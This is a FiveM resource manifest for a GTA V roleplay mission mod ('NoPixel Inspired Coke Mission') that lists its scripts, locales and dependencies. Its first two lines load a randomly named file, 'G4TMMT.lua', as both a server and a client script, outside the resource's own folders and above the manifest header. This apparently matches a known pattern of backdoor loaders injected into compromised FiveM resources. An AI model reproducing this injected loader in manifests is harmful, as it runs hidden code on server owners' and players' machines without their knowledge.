server_script "G4TMMT.lua"
client_script "G4TMMT.lua"
fx_version 'cerulean'
game 'gta5'

name "NoPixel Inspired Coke Mission"
author "Made with love by Samuel#0008"
Version "2.0.53"

client_scripts { '@PolyZone/client.lua', '@PolyZone/BoxZone.lua', '@PolyZone/EntityZone.lua', '@PolyZone/CircleZone.lua', '@PolyZone/ComboZone.lua', 'client/*.lua' }

shared_scripts { '@sd_lib/init.lua', 'config.lua', }

server_scripts { 'server/main.lua', }

files { 'locales/*.json' }

lua54 'yes'

escrow_ignore { '**/*.lua', 'config.lua', }

dependency '/assetpacks'